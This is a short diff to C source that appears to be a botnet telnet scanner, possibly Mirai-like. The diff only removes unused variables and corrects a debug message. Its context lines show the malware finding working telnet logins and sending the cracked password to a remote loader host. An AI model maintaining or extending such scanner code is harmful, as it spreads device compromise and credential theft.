@@ -612,8 +612,6 @@ void scanner_init(char* localIpAddress, char* callbackIpAddress)
                             }
                             else if (consumed > 0)
                             {
-                                char *tmp_str;
-                                int tmp_len;
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
 #endif
@@ -984,7 +982,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
 
 #ifdef DEBUG
-    printf("[report] Send scan result to loader\n");
+    printf("[report] Sent scan result to loader\n");
 #endif
 
     close(fd);
